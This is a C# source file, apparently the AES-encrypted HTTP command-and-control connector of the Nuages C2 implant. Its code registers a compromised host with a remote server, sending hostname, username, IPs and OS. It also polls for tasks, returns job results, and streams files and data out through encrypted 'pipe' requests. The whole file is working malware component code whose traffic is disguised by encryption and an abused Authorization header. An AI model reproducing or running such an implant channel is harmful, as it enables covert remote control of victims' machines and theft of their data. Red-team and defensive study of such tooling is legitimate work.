using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using System.Text;

namespace NuagesSharpImplant
{
    class AESHelper
    {
        byte[] key;

        static byte[] Sha256(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                return sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

            }
        }

        public AESHelper(string password) {

            this.key = Sha256(password);

        }

        public byte[] EncryptString(string message)
        {
            var aes = new AesCryptoServiceProvider();
            aes.Mode = CipherMode.CBC;
            aes.KeySize = 256;
            aes.Padding = PaddingMode.PKCS7;
            byte[] iv = aes.IV;
            using (var memStream = new System.IO.MemoryStream())
            {
                memStream.Write(iv, 0, iv.Length); 
                using (var cryptStream = new CryptoStream(memStream, aes.CreateEncryptor(this.key, aes.IV), CryptoStreamMode.Write))
                {
                    using (var writer = new System.IO.StreamWriter(cryptStream))
                    {
                        writer.Write(message);
                    }
                }
                var buf = memStream.ToArray();
                return buf;
            }
        }

        public string DecryptString(byte[] bytes)
        {
            //var bytes = Convert.FromBase64String(encryptedValue);
            var aes = new AesCryptoServiceProvider();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.KeySize = 256;
            using (var memStream = new System.IO.MemoryStream(bytes))
            {
                var iv = new byte[16];
                memStream.Read(iv, 0, 16);
                using (var cryptStream = new CryptoStream(memStream, aes.CreateDecryptor(this.key, iv), CryptoStreamMode.Read))
                {
                    using (var reader = new System.IO.StreamReader(cryptStream))
                    {
                        return reader.ReadToEnd();
                    }
                }
            }
        }
    }

    public class NuagesC2PyAES256 : NuagesC2Connector
    {
        private string connectionString;

        private string handler = "PyAES256";

        public int refreshrate;

        public int buffersize;

        private AESHelper aes;

        public NuagesC2PyAES256(string connectionString, string password, int buffersize, int refreshrate)
        {
            this.connectionString = connectionString;
            this.aes = new AESHelper(password);
            this.refreshrate = refreshrate;
            this.buffersize = buffersize;
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        string POST(string url, string jsonContent)
        {
            byte[] byteArray =  this.aes.EncryptString(jsonContent);

            byte[] EncUrl = this.aes.EncryptString(url);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString);

            request.Method = "POST";

            System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();

            //Byte[] byteArray = encoding.GetBytes(content);
            request.Headers.Add("Authorization", Convert.ToBase64String(EncUrl, 0, EncUrl.Length));
            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/x-www-form-urlencoded";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    //StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.GetEncoding("utf-8"));
                    MemoryStream ms = new MemoryStream();
                    responseStream.CopyTo(ms);
                    byte[] bytes = ms.ToArray();
                    return this.aes.DecryptString(bytes);
                }
            }
        }

        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            JObject body = new JObject(
                new JProperty("n", n),
                new JProperty("moreData", moreData),
                new JProperty("error", error),
                new JProperty("result", result),
                new JProperty("jobId", jobId),
                new JProperty("data", data)
            );
            this.POST( "jobresult", body.ToString());
        }

        public string RegisterImplant(string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> options = null, String[] supportedPayloads = null)
        {
            JObject body = new JObject(
                new JProperty("hostname", hostname),
                new JProperty("username", username),
                new JProperty("localIp", localIp),
                new JProperty("sourceIp", sourceIp),
                new JProperty("os", os),
                new JProperty("handler", handler),
                new JProperty("connectionString", connectionString),
                new JProperty("options", JObject.FromObject(options)),
                new JProperty("supportedPayloads", JArray.FromObject(supportedPayloads))
            );
            JObject response = JObject.Parse(this.POST("register", body.ToString()));
            return response["_id"].ToString();
        }

        public JArray Heartbeat(string implantId)
        {
            JObject body = new JObject(
                new JProperty("id", implantId)
            );
            JObject response = JObject.Parse(this.POST("heartbeat", body.ToString()));
            return (JArray)response["data"];
        }

        public byte[] PipeRead(string pipe_id, int BytesWanted) {
            byte[] buffer;
            using (MemoryStream memory = new MemoryStream()) {
                while (memory.Length < BytesWanted) {
                    JObject body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", Math.Min(this.buffersize, BytesWanted - memory.Length))
                    );
                    JObject response = JObject.Parse(this.POST("io", body.ToString()));
                    buffer = Convert.FromBase64String(response["out"].ToString());
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.refreshrate);
                }
                return memory.ToArray();
            }
        }

        public void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer;
            while (ReadBytes < BytesWanted)
            {
                JObject body = new JObject(
                new JProperty("pipe_id", pipe_id),
                new JProperty("maxSize", Math.Min(this.buffersize, BytesWanted - ReadBytes))
                );
                JObject response = JObject.Parse(this.POST("io", body.ToString()));
                buffer = Convert.FromBase64String(response["out"].ToString());
                ReadBytes += buffer.Length;
                stream.Write(buffer, 0, buffer.Length);
                System.Threading.Thread.Sleep(this.refreshrate);
            }
        }

        public void Stream2Pipe(string pipe_id, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer = new byte[this.buffersize];
            JObject body;
            while ((ReadBytes = stream.Read(buffer, 0, this.buffersize)) > 0)
            {
                if (ReadBytes < this.buffersize) {
                    byte[] buffer2 = new byte[ReadBytes];
                    Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
                    body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", 0),
                    new JProperty("in", Convert.ToBase64String(buffer2))
                    );
                }
                else {
                    body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", 0),
                     new JProperty("in", Convert.ToBase64String(buffer))
                    );
                }
                this.POST("io", body.ToString());
                System.Threading.Thread.Sleep(this.refreshrate);
            }
        }

        public byte[] PipeRead(string pipe_id)
        {
            JObject body = new JObject(
                    new JProperty("pipe_id", pipe_id),
                    new JProperty("maxSize", this.buffersize)
                );
            JObject response = JObject.Parse(this.POST("io", body.ToString()));
            return Convert.FromBase64String(response["out"].ToString());
        }

    }
}
